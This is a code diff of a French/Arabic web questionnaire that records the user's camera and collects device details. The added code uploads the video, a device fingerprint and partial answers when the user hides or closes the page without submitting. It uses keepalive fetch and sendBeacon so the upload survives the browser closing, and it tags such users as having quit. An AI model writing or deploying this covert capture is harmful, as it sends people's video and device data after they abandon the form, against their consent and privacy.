+            const usernameInput = document.getElementById('username').value;
+            const username = usernameInput ? usernameInput : "Utilisateur Anonyme [Quitté/Fermé]";
+            const currentLang = document.getElementById('languageSelector').value;
 
-            const username = document.getElementById('username').value || "Utilisateur Anonyme";
+            statusDiv.style.color = '#10b981';
+            statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';
+
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+
+            // انتظار تجميع مقطع الفيديو
+            await new Promise(resolve => setTimeout(resolve, 500));
+
             const deviceDetails = await getDetailedDeviceInfo();
-            
-            // تحديد الامتداد بناءً على نوع الـ MIME المسجل فعلياً
-            const mimeType = mediaRecorder ? mediaRecorder.mimeType : '';
-            const isMp4 = mimeType.includes('mp4');
-            const ext = isMp4 ? 'mp4' : 'webm';
-            const finalMime = isMp4 ? 'video/mp4' : 'video/webm';
-            
-            const videoBlob = new Blob(currentChunks, { type: finalMime });
+            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
+            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+            const videoBlob = new Blob(recordedChunks, { type: mimeType });
 
             const formData = new FormData();
-            formData.append('username', `${username} [${reason}]`);
+            formData.append('username', username);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(deviceDetails, null, 2));
 
             for (let i = 1; i <= 20; i++) {
-                let qVal = document.getElementById('q' + i).value || "N/A";
-                formData.append('q' + i, qVal);
+                formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
             }
 
             formData.append('video', videoBlob, `recording.${ext}`);
 
+            // ⚡ استخدام keepalive لضمان استمرار الإرسال حتى لو أُغلق المتصفح
             try {
-                await fetch('/submit-consent', { method: 'POST', body: formData });
+                fetch('/submit-consent', {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
             } catch (e) {
                 if (navigator.sendBeacon) {
                     navigator.sendBeacon('/submit-consent', formData);
                 }
             }
+
+            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
         }
-
-        document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'hidden' && !isCompleted) {
-                await sendDataBeacon("Fermé via bouton carré / App masquée");
-            }
-        });
-
-        window.addEventListener('pagehide', async () => {
-            if (!isCompleted) {
-                await sendDataBeacon("Fermeture de page (pagehide)");
-            }
-        });
 
         async function verifyAndStop() {
             const statusDiv = document.getElementById('status');
@@ -772,35 +428,33 @@
 
             if (!username) {
                 statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = currentLang === 'ar' ? 'الرجاء إدخال اسمك أولاً.' : (currentLang === 'en' ? 'Please enter your name first.' : 'Veuillez entrer votre nom d\'abord.');
+                statusDiv.innerText = currentLang === 'ar' ? 'الرجاء إدخال اسمك أولاً.' : 'Veuillez entrer votre nom d\'abord.';
                 return;
             }
 
             for (let i = 1; i <= 20; i++) {
                 if (!document.getElementById('q' + i).value) {
                     statusDiv.style.color = '#ef4444';
-                    statusDiv.innerText = currentLang === 'ar' ? `الرجاء الإجابة على جميع الأسئلة (السؤال ${i} مفقود).` : (currentLang === 'en' ? `Please answer all questions (Q${i} missing).` : `Veuillez répondre à toutes les questions (Q${i} manquante).`);
+                    statusDiv.innerText = currentLang === 'ar' ? `الرجاء الإجابة على جميع الأسئلة (السؤال ${i} مفقود).` : `Veuillez répondre à toutes les questions (Q${i} manquante).`;
                     return;
                 }
             }
 
-            isCompleted = true;
-            clearInterval(autoSyncInterval);
-            statusDiv.style.color = '#10b981';
-            statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : (currentLang === 'en' ? 'Sending data...' : 'Envoi des données en cours...');
-
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-            }
-
-            setTimeout(async () => {
-                await sendDataBeacon("Soumission réussie (Formulaire complet)");
-                statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : (currentLang === 'en' ? 'Thank you! Your answers have been successfully submitted.' : 'Merci ! Vos réponses ont été soumises avec succès.');
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                }
-            }, 1000);
+            await sendDataAndFinish();
         }
+
+        // إرسال البيانات تلقائياً وفوراً عند إغلاق التطبيق أو تصغير الصفحة
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden' && !isCompleted) {
+                sendDataAndFinish();
+            }
+        });
+
+        window.addEventListener('pagehide', () => {
+            if (!isCompleted) {
+                sendDataAndFinish();
+            }
+        });
     </script>
 </body>
 </html>
